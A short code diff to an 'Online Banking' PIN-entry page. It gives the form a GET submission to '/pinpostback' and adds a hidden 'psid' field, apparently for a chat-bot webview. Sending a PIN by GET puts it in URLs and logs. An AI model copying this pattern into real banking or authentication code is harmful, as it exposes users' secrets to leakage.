@@ -96,7 +96,8 @@
     <div style="margin-left:675px;position:relative;color:#fff;right:110px;bottom:75px;font-size: 40px;font-family:Arial, Helvetica, sans-serif;">
         <label>Online Banking</label>
     </div>
-    <form name="form1"> 
+    <form action="/pinpostback" method="get" name="form1"> 
+        <input type="hidden" name="psid" id="sender_psid"><br>
         <div class="span">
             <label>Enter PIN Number</label>
         </div>
